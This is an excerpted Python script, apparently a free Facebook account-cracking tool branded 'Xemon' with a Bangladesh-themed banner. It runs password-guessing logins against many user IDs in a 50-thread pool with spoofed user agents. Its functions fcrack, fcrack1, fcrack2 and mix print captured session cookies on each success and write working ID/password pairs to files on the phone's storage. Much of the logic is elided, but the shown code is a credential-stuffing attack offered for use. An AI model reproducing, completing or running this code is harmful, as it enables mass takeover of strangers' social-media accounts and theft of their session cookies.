...
\033[1;93m┌━━━━━━━━━━━━━━━━━━\033[1;93m ━━━━━━━━━━━━━━━━━━━━┐
\033[1;91m│ ❲★❳ AUTHOR   : 𝓧𝓮𝓶𝓸𝓷
\033[1;91m│ ❲★❳ GITHUB   : 𝓧𝓮𝓶𝓸𝓷          
\033[1;91m│ ❲★❳ WHATSAPP : +➑➑⓿➊➎➐➐⓿➊➒➏➌➋      
\033[1;91m│ ❲★❳ TOOLS    : \033[1;32mＦＲＥＥ  \033[1;37m                         
...
def random_apk():
	...
	with ThreadPool(max_workers=50) as yaari:
		...
		banner()
		tl = str(len(user))
		print(f" {P}[{H}★{P}]{WHITE} FROM      :\033[38;5;91m Bangladesh")
		print(f' {P}[{H}★{P}]{WHITE} AGENTS    : '+str(len(ugen)))
		print(f" {P}[{H}★{P}]{WHITE} CRACK ID  :\033[38;5;91m {GREEN}"+tl)
		print(f' {P}[{H}★{P}]{WHITE} SIM CODE  :\033[1;91m {kode} ')
		print(f" {P}[{H}★{P}]{WHITE} METHUD    :\033[1;91m{doamin}")
...
def mix(uid,pwx,tl):
    ...
    'user-agent': 'pro',}
            ...
            if 'c_user' in log_cookies:
                ...
                #cek_apk(session,coki)
                oks.append(cid)
                open('/sdcard/EN-RNDM-OK.txt', 'a').write(uid+' | '+ps+' | '+uid+'\n')
                break
            else:
                continue
        loop+=1
...
def fcrack(uid,pwx,tl):
    ...
    'user-agent': 'pro',}
            ...
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[65:80]
                print(f'\033[1;92m [xemon🔹>OK] '+uid+' | '+ps+'\33[0;92m')
                print(f'\033[1;93m   [💥] COOKIE (1) \033[1;92m : '+coki)
                #cek_apk(session,coki)
                oks.append(cid)
                open('/sdcard/EN-RNDM-OK.txt', 'a').write(uid+' | '+ps+' | '+uid+'\n')
        ...
        loop+=1
        sys.stdout.write(f'\r\033[m[xemon🔹🔸] \033[1;92m%s\033[m |\033[m[\033[mOK:\033[1;92m%s\033[m] '%(loop,len(oks))),
       # sys.stdout.write(f" \r{R} [{B}EMON{R}]  {P}[{k}{loop}{P}/{h}{len(id)}{P}]Ã¢â‚¬â€{P}[{H}{ok}{P}]Ã¢â‚¬â€{P}[{k}{cp}{x}]Ã¢â‚¬â€[{bo}{'{:.0%}'.format(loop/float(len(id)))}{P}]  ")
        sys.stdout.flush()
    except:
        pass
...
def fcrack1(uid,pwx,tl):
    ...
    'user-agent': 'pro',}
            ...
            if 'c_user' in log_cookies:
                ...
                #cek_apk(session,coki)
                oks.append(cid)
                open('/sdcard/EN-RNDM-OK.txt', 'a').write(cid+' | '+ps+' | '+uid+'\n')
...
def fcrack2(uid,pwx,tl):
    ...
    'user-agent': 'pro',}
            ...
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[65:80]
                print(f'\033[1;92m  [xemonOK💧] '+uid+' | '+ps+'\33[0;92m')
                print(f'\033[1;93m   [💥] COOKIE (1) \033[1;92m : '+coki)
               #cek_apk(session,coki)
                oks.append(cid)
                open('/sdcard/xemon-RNDM-OK.txt', 'a').write(cid+' | '+ps+' | '+uid+'\n')
